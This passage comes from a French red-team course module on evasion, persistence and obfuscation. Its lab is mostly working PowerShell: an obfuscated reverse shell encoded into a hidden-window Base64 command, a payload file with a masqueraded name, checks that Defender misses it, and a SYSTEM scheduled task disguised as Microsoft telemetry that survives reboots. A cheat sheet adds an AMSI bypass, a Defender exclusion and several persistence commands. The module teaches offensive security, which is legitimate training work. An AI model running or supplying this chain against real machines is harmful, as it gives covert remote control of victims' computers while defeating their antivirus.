$p6 = "Str" + "eamReader"
$p7 = "Str" + "eamWriter"

Set-Variable -Name $var1 -Value $p1
Set-Variable -Name $var2 -Value $p2

# Code du reverse shell splitté
$cmd = @"
`$$var4 = & (Get-Variable $var1 -ValueOnly) (Get-Variable $var2 -ValueOnly)("$p3",$p4);
`$s = `$$var4.${p5}();
`$r = `$null;
try {
    while(`$$var4.Connected) {
        `$d = & (Get-Variable $var1 -ValueOnly) System.IO.${p6}(`$s);
        `$c = `$d.ReadLine();
        if(`$c -eq 'exit') { break }
        `$o = Invoke-Expression `$c 2>&1 | Out-String;
        `$w = & (Get-Variable $var1 -ValueOnly) System.IO.${p7}(`$s);
        `$w.AutoFlush = `$true;
        `$w.WriteLine(`$o);
    }
} catch {} finally {
    `$$var4.Close();
}
"@

# Encodage Base64 UTF-16LE du script complet
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64Payload = [Convert]::ToBase64String($bytes)

Write-Host "[+] Payload Base64 généré :" -ForegroundColor Green
Write-Host "powershell.exe -NoP -NonI -W Hidden -Enc $b64Payload"
```

#### Étape 3 — Test de contournement Defender

```powershell
# Sur la cible Windows — TEST initial AVANT la persistance

# 1. Vérifier l'état de Defender
$defenderStatus = Get-MpComputerStatus
Write-Host "Defender Real-Time Protection : $($defenderStatus.RealTimeProtectionEnabled)" -ForegroundColor Cyan
Write-Host "Defender Antivirus Enabled   : $($defenderStatus.AntivirusEnabled)" -ForegroundColor Cyan

# 2. Sauvegarder le payload dans un emplacement discret
$payloadPath = "C:\Users\Public\Documents\Microsoft\winsysupdate.ps1"

# 3. ÉCRIRE LE PAYLOAD OBFUSQUÉ DANS LE FICHIER
$payloadContent = @'
# [INSÉRER LE PAYLOAD OBFUSQUÉ GÉNÉRÉ À L'ÉTAPE 2]
# ...
Write-Output "Test réussit - $(Get-Date)"
'@
Set-Content -Path $payloadPath -Value $payloadContent -Force

# 4. Vérifier que Defender ne bloque pas
Start-Sleep -Seconds 2
if (Test-Path $payloadPath) {
    $content = Get-Content $payloadPath -Raw
    if ($content.Length -gt 0) {
        Write-Host "[+] Payload écrit avec succès — non détecté par Defender" -ForegroundColor Green
    }
} else {
    Write-Host "[-] Payload supprimé par Defender! Renforcer l'obfuscation" -ForegroundColor Red
}

# 5. Tester l'exécution du payload
# ⚠️ S'assurer que le listener est actif sur Kali AVANT cette étape
# nc -lvnp 4444
```

#### Étape 4 — Installation de la persistance

```powershell
# Sur la cible Windows — installer la Scheduled Task persistante

# 1. Préparer le chemin complet de la commande (obfusquée aussi)
$taskName = "Microsoft\Windows\Application Experience\Microsoft Compatibility Telemetry"
$taskCommand = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"C:\Users\Public\Documents\Microsoft\winsysupdate.ps1`""

# 2. Créer la tâche planifiée avec le maximum de camouflage
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"C:\Users\Public\Documents\Microsoft\winsysupdate.ps1`""

# Déclencheurs multiples — maximise les chances d'exécution
$trigger1 = New-ScheduledTaskTrigger -AtLogOn
$trigger2 = New-ScheduledTaskTrigger -Daily -At "09:00"
$trigger3 = New-ScheduledTaskTrigger -AtStartup

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" `
    -LogonType ServiceAccount -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -Compatibility Win8 `
    -ExecutionTimeLimit 0 `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 5)

# Enregistrer la tâche
Register-ScheduledTask `
    -TaskName "Microsoft Compatibility Telemetry" `
    -TaskPath "\Microsoft\Windows\Application Experience\" `
    -Action $action `
    -Trigger $trigger1, $trigger2, $trigger3 `
    -Principal $principal `
    -Settings $settings `
    -Force | Out-Null

Write-Host "[+] Persistance installée via Scheduled Task" -ForegroundColor Green

# 3. Vérifier l'installation
$task = Get-ScheduledTask -TaskName "Microsoft Compatibility Telemetry" `
    -TaskPath "\Microsoft\Windows\Application Experience\" `
    -ErrorAction SilentlyContinue

if ($task) {
    Write-Host "[✓] Tâche vérifiée : $($task.TaskName)" -ForegroundColor Green
    Write-Host "    Chemin  : $($task.TaskPath)" -ForegroundColor Gray
    Write-Host "    État    : $($task.State)" -ForegroundColor Gray
    Write-Host "    Principal: $($task.Principal.UserId)" -ForegroundColor Gray
} else {
    Write-Host "[✗] Échec de l'installation de la tâche" -ForegroundColor Red
}
```

#### Étape 5 — Test de survie au reboot

```powershell
# Sur la cible Windows — Vérifier la survie après reboot

# 1. Déclencher manuellement la tâche pour valider qu'elle fonctionne
Start-ScheduledTask -TaskName "Microsoft Compatibility Telemetry" `
    -TaskPath "\Microsoft\Windows\Application Experience\"

Start-Sleep -Seconds 5

# 2. Vérifier que le payload s'est exécuté (présence du processus)
$process = Get-Process -Name "powershell" -ErrorAction SilentlyContinue
if ($process) {
    Write-Host "[+] Payload en cours d'exécution — processus PowerShell détecté" -ForegroundColor Green
}

# 3. SUR LE KALI — vérifier la connexion
# Un reverse shell doit apparaître dans le listener nc
```

### 6.4 Tableau ATT&CK du TP

| Étape | Technique | ID MITRE | Description |
|-------|-----------|----------|-------------|
| Génération shellcode | Obfuscated Files or Information | T1027 | Shellcode encodé XOR + Base64 |
| Split strings PowerShell | Obfuscated Files or Information | T1027.010 | Chaînes fractionnées pour éviter signatures |
| Écriture payload sur disque | Masquerading | T1036 | Nom légitime (winsysupdate.ps1) |
| Défense antivirus | Impair Defenses | T1562.001 | Contournement de Defender par obfuscation |
| Reverse Shell TCP | Command and Scripting Interpreter | T1059.001 | PowerShell reverse shell |
| Création Scheduled Task | Scheduled Task | T1053.005 | Persistance planifiée |
| Exécution SYSTEM | Abuse Elevation Control Mechanism | T1548.002 | Principal SYSTEM sur la tâche |
| Déclencheur multiple | Boot or Logon Autostart Execution | T1547 | Tâche au démarrage + connexion |
| Test reboot | — | — | Validation compromission persistante |

### 6.5 Critères de réussite

| Critère | Validation |
|---------|-----------|
| Le payload PowerShell n'est pas détecté par Defender | ✓ Fichier .ps1 présent sur le disque |
| La tâche planifiée est créée | ✓ Visible dans `Get-ScheduledTask` |
| Le payload s'exécute correctement | ✓ Reverse shell reçu sur Kali |
| Le payload survit à un reboot | ✓ Reconnexion après `Restart-Computer` |
| Le payload est furtif | ✓ Pas d'alerte Defender, pas de popup utilisateur |

---

## 7. Références

### 7.1 MITRE ATT&CK

| Ressource | URL |
|-----------|-----|
| Defense Evasion (TA0005) | https://attack.mitre.org/tactics/TA0005/ |
| Persistence (TA0003) | https://attack.mitre.org/tactics/TA0003/ |
| T1027 — Obfuscated Files | https://attack.mitre.org/techniques/T1027/ |
| T1053.005 — Scheduled Task | https://attack.mitre.org/techniques/T1053/005/ |
| T1546.003 — WMI Event Subscription | https://attack.mitre.org/techniques/T1546/003/ |
| T1562.001 — Disable or Modify Tools | https://attack.mitre.org/techniques/T1562/001/ |

### 7.2 Outils

| Outil | Description | Lien |
|-------|-------------|------|
| ScareCrow | Loader furtif avec unhooking, syscalls directes | https://github.com/Tylous/ScareCrow |
| Donut | Convertisseur PE/.NET en shellcode | https://github.com/TheWover/donut |
| UPX | Packer/compresseur PE | https://upx.github.io |
| msfvenom | Générateur de payloads Metasploit | https://docs.metasploit.com |
| Sysinternals (Autoruns) | Détection de persistance | https://docs.microsoft.com/sysinternals |
| Process Monitor | Monitoring de DLL/processus | https://docs.microsoft.com/sysinternals |

### 7.3 Lectures complémentaires

- NIST SP 800-83 Rev. 1 — Guide to Malware Incident Prevention and Handling
- NIS2 Directive (EU) 2022/2555 — Article 21: Cybersecurity risk-management measures
- Windows Internals, Part 1 & 2 — Mark Russinovich (Microsoft Press)
- "Evading EDR" — Matt Hand (No Starch Press)
- "The Rootkit Arsenal" — Bill Blunden (Jones & Bartlett)
- "Red Team Development and Operations" — Joe Vest, James Tubberville

### 7.4 Cheat Sheet Récapitulative

```
┌──────────────────────────────────────────────────────────────────┐
│               CHEAT SHEET — ÉVASION, PERSISTANCE, OBFUSCATION    │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  AV IDENTIFICATION                                               │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Get-CimInstance -Namespace root/SecurityCenter2             │ │
│  │     -ClassName AntivirusProduct                             │ │
│  │ Get-MpComputerStatus  # Defender Status                    │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  AMSI BYPASS                                                     │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ [Ref].Assembly.GetTypes() | ?{$_.Name -like '*iUtils'}     │ │
│  │ → SetValue → amsiInitFailed = true                         │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  DEFENDER EXCLUSION                                              │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Add-MpPreference -ExclusionPath "C:\Users\Public\..."       │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  PERSISTANCE                                                     │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ REGISTRE : HKCU/HKLM\...\Run → RegValue = commande         │ │
│  │ SCHTASKS : schtasks /create /tn "Nom" /tr "cmd" /sc ONLOGON│ │
│  │ SERVICE  : sc create "Nom" binPath= "cmd" start= auto      │ │
│  │ WMI      : __EventFilter + CommandLineEventConsumer         │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  OBFUSCATION                                                     │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ PowerShell : split strings, Base64, compression GZip        │ │
│  │ Msfvenom   : -e x64/xor -i 7 (7 itérations d'encodage)     │ │
│  │ C# Loader  : AES déchiffrement + VirtualAlloc + CreateThread│ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

**Fin du Module 13 — Évasion, Persistance & Obfuscation**

*Document rédigé pour le cursus M2 Red Team — SDV 2026*
*Toutes les techniques présentées doivent être utilisées uniquement dans un cadre légal et autorisé.*
